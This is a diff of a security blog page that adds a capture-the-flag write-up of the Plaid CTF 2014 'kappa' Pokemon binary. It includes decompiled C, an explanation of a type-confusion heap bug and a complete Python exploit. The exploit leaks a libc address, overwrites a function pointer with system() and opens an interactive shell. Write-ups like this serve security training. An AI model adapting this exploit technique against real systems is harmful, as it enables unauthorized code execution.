@@ -9,45 +9,7 @@
   <meta name="author" content="pwn_expoit">
 
   
-  <meta name="description" content="[fusion 4 only exploit] (fusion.py) download
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38 &hellip;">
+  <meta name="description" content="i recently prepare Codegate held in 2016,So i needed to write up ctf. i writed up ezhp(plaid ctf), now it&rsquo;s time to write up kappa. Let&rsquo;s &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -117,6 +79,386 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/12/26/plaid-ctf-kappa-275-in-2014/">Plaid Ctf Kappa[275] in 2014</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-12-26T01:13:36-08:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>26</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:13 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>i recently prepare Codegate held in 2016,So i needed to write up ctf. i writed up ezhp(plaid ctf), now it&rsquo;s time to write up kappa. Let&rsquo;s start breaking kappa</p>
+
+<p>Kappa is Pokemon Game binary</p>
+
+<figure class='code'><figcaption><span>[Kappa Menu] (kappaMenu.c)</span> <a href='/codeview/kappaMenu.c'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">sleep</span><span class="p">(</span><span class="mi">1u</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">sub_80491F6</span><span class="p">();</span>
+</span><span class='line'>  <span class="n">sub_80486DC</span><span class="p">();</span>
+</span><span class='line'>  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>    <span class="k">switch</span> <span class="p">(</span> <span class="n">sub_804886E</span><span class="p">()</span> <span class="p">)</span>
+</span><span class='line'>    <span class="p">{</span>
+</span><span class='line'>      <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
+</span><span class='line'>        <span class="n">sub_8048DE3</span><span class="p">();</span>
+</span><span class='line'>        <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+</span><span class='line'>        <span class="n">sub_8048F56</span><span class="p">();</span>
+</span><span class='line'>        <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+</span><span class='line'>        <span class="n">vuln_execute</span><span class="p">();</span>
+</span><span class='line'>        <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+</span><span class='line'>        <span class="n">advice</span><span class="p">();</span>
+</span><span class='line'>        <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>      <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+</span><span class='line'>        <span class="n">vulne_exploit</span><span class="p">();</span>
+</span><span class='line'>        <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>      <span class="k">default</span><span class="o">:</span>
+</span><span class='line'>        <span class="k">continue</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>there are 1-5 select that can choose. opening binary with IDA pro, i could see select function and Battle function.
+File /home/pwn/Desktop/octopress/source/codeview/KappaChoose1.c could not be found
+first select function is Battle system with wild Pokemon
+it is algorithm that encounter pokemon with &lsquo;an&rsquo; sequence(0: fail, 1: Kakuna, 2: charizar)
+[a1 = 0, a2 = 1, a3 = 0, a4 = 1, a5 = 0 &hellip;&hellip; a13 = 2]
+wild Pokemon is producted with other function. this function product struct using malloc. this method can become vulnerability on UAF. for now, i perceived it vulnerabilty
+(%include_code [wild Pokemon struct] kappawild.c%)
+i find out vulnerability in Battle function that wild producted function include. it is type confusion.
+this vulnerability is happened when i throw pokeball to wild pokemon with filling all of pokeball room</p>
+
+<figure class='code'><figcaption><span>[type confusion] (kappavuln.c)</span> <a href='/codeview/kappavuln.c'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'> <span class="n">puts</span><span class="p">(</span><span class="s">&quot;What would you like to name this Pokemon?&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">argv2</span> <span class="o">+</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">argv2</span><span class="p">,</span> <span class="mh">0xEu</span><span class="p">))</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_poke</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="p">)</span>
+</span><span class='line'>    <span class="p">{</span>
+</span><span class='line'>      <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_poke</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">argv1</span><span class="p">;</span>
+</span><span class='line'>      <span class="n">type_data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>
+</span><span class='line'>      <span class="k">return</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Oh no! you don&#39;t have any more room for a Pokemon! Choose a pokemon to replace!&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">v7</span> <span class="o">=</span> <span class="n">sub_80488C9</span><span class="p">();</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="p">)</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">&lt;=</span> <span class="mi">4</span> <span class="p">)</span>
+</span><span class='line'>    <span class="p">{</span>
+</span><span class='line'>      <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_poke</span> <span class="o">+</span> <span class="n">v7</span><span class="p">));</span>
+</span><span class='line'>      <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_poke</span> <span class="o">+</span> <span class="n">v7</span><span class="p">)</span> <span class="o">=</span> <span class="n">argv1</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="k">else</span>
+</span><span class='line'>    <span class="p">{</span>
+</span><span class='line'>      <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Invalid Choice!&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>  <span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>it ignore their type, blindly cover type field. then attacker can overflow in select 5</p>
+
+<figure class='code'><figcaption><span>[change art] (kappaart.c)</span> <a href='/codeview/kappaart.c'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">change_art</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">ssize_t</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax@2</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">src</span><span class="p">[</span><span class="mi">4000</span><span class="p">];</span> <span class="c1">// [sp+10h] [bp-FB8h]@2</span>
+</span><span class='line'>  <span class="kt">size_t</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [sp+FB0h] [bp-18h]@1</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [sp+FB4h] [bp-14h]@1</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+FB8h] [bp-10h]@1</span>
+</span><span class='line'>  <span class="kt">size_t</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+FBCh] [bp-Ch]@1</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">v5</span> <span class="o">=</span> <span class="n">sub_80488C9</span><span class="p">();</span>
+</span><span class='line'>  <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_poke</span> <span class="o">+</span> <span class="n">v5</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">n</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">15</span><span class="p">));</span>
+</span><span class='line'>  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="n">v0</span> <span class="p">)</span>
+</span><span class='line'>    <span class="n">v0</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">src</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">n</span> <span class="o">-</span> <span class="n">i</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">memcpy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">15</span><span class="p">),</span> <span class="n">src</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+</span><span class='line'>  <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="n">n</span> <span class="o">+</span> <span class="mi">15</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&quot;I&#39;m sure you&#39;ll love to show this new art to your friends!&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>change artwork function change each other pokemon artwork(heap+15). if i cover type using vunlerblilty.</p>
+
+<h1>kakuna struct: </h1>
+
+<h1>|name|      art      |0x878|hp|attack|technic|func_ptr</h1>
+
+<h1>charizar struct:</h1>
+
+<h1>|name|       art      |0x204|hp|attack|technic|func_ptr</h1>
+
+<hr />
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/kappaexploit.c could not be found
+Do you find out?</p>
+
+<p>i change charizar to kakuna, set free func_ptr using above function</p>
+
+<p>this is final payload</p>
+
+<figure class='code'><figcaption><span>[Payload] (kappa_final.py)</span> <a href='/codeview/kappa_final.py'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="kn">from</span> <span class="nn">pwn_expoit</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">libc</span><span class="p">():</span>
+</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">Netcon</span><span class="p">(</span><span class="s">&#39;192.168.224.152&#39;</span><span class="p">,</span><span class="mi">4444</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">):</span>
+</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;3. Run&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;Pokemon?&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;name</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">):</span>
+</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;3. Run&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;Pokemon?&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;shot</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;5. name&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;3. Run&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;3. Run&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;3. Run&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;3. Run&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;3. Run&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;Pokemon?&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">name</span> <span class="o">=</span> <span class="s">&quot;/bin/sh</span><span class="se">\x00</span><span class="s">&quot;</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;5. name&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;3</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;5</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;5. name&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;3</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">dat</span>  <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>  <span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">509</span>
+</span><span class='line'>  <span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048512</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048766</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;C&quot;</span><span class="o">*</span><span class="mi">1610</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">dat</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;3</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">r</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)[</span><span class="mh">0xf85</span><span class="p">:</span><span class="mh">0xf89</span><span class="p">])</span>
+</span><span class='line'>  <span class="n">argv</span> <span class="o">=</span> <span class="p">[]</span>
+</span><span class='line'>  <span class="n">argv</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">argv</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">argv</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">r</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;5</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;5. name&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;3</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">libc_base</span> <span class="o">=</span> <span class="n">r</span><span class="o">-</span><span class="mh">0xdabd0</span>
+</span><span class='line'>  <span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x40190</span>
+</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;libc_base : &quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;system : &quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">dat</span>  <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>  <span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">513</span>
+</span><span class='line'>  <span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;C&quot;</span><span class="o">*</span><span class="mi">1610</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">dat</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;3</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;Attack: Tackle&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">interact</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</span><span class='line'><span class="n">argv</span> <span class="o">=</span> <span class="n">libc</span><span class="p">()</span>
+</span><span class='line'><span class="n">pwn</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -729,6 +1071,10 @@
     <section>
   <h1>Recent Posts</h1>
